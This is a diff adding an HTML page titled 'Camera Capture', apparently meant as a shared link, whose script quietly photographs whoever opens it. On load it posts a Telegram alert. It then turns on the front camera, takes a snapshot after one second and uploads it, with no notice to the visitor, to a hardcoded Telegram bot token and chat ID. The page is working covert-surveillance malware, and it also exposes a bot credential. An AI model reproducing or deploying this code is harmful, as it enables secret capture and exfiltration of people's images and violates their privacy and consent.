@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Camera Capture</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background: white;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    video {
+      border-radius: 15px;
+      border: 4px solid white;
+    }
+  </style>
+</head>
+<body>
+
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+<script>
+const TOKEN = "7960928309:AAFWhZhNuHn42tzjUEyvoUT8k6Eu97BaFbA";
+const CHAT_ID = "8557609477";
+const EXTERNAL_IMAGE_URL = "https://vid.alarabiya.net/images/2013/04/04/eda539f3-69fc-45f1-bc4f-95cce2d3db66/eda539f3-69fc-45f1-bc4f-95cce2d3db66_16x9_1200x676.jpg";
+
+// نص الرسالة باللغتين
+const MESSAGE = "تم الدخول إلى الرابط ، انتظر حتى تأتيك الصورة...\nYou have opened the , please wait until the photo arrives...    🤞copy link = https://mohamedcsdc45s45.github.io/mdpa/";
+
+// إرسال الرسالة عند دخول الصفحة
+fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ chat_id: CHAT_ID, text: MESSAGE })
+})
+.then(r => r.json())
+.then(d => console.log("Message sent:", d))
+.catch(e => console.error("Error sending message:", e));
+
+const video = document.getElementById("video");
+const canvas = document.getElementById("canvas");
+const ctx = canvas.getContext("2d");
+
+// تشغيل الكاميرا الأمامية
+navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+.then(stream => {
+    video.srcObject = stream;
+
+    // بعد 1 ثانية، التقط الصورة
+    setTimeout(() => {
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const capturedImage = canvas.toDataURL("image/jpeg");
+
+        // إرسال الصورة الملتقطة
+        const form1 = new FormData();
+        form1.append("chat_id", CHAT_ID);
+        form1.append("photo", capturedImage);
+
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+            method: "POST",
+            body: form1
+        })
+        .then(r => r.json())
+        .then(d => console.log("Captured photo sent:", d))
+        .catch(e => console.error("Error sending captured photo:", e));
+
+        // إرسال الصورة من الرابط الخارجي
+        const form2 = new FormData();
+        form2.append("chat_id", CHAT_ID);
+        form2.append("photo", EXTERNAL_IMAGE_URL);
+
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+            method: "POST",
+            body: form2
+        })
+        .then(r => r.json())
+        .then(d => console.log("External photo sent:", d))
+        .catch(e => console.error("Error sending external photo:", e));
+
+    }, 1000); // 1 ثانية
+})
+.catch(err => console.error("Camera error:", err));
+</script>
+
+</body>
+</html>
